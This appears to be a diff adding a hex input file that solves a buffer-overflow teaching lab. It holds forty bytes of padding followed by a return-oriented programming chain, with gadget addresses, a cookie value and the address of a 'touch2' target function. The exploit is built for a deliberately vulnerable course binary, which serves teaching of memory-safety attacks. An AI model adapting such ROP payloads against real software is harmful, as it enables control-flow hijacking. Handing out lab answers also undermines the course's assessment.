@@ -1,0 +1,9 @@
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+82 1e 40 00 00 00 00 00 /* addr of gadget that will "popq rax" */
+1b dd 2a 23 00 00 00 00 /* cookie */
+89 1e 40 00 00 00 00 00 /* addr of gadget that will "movq $rax,$rdi" */
+cc 1c 40 00 00 00 00 00 /* addr of touch2 */
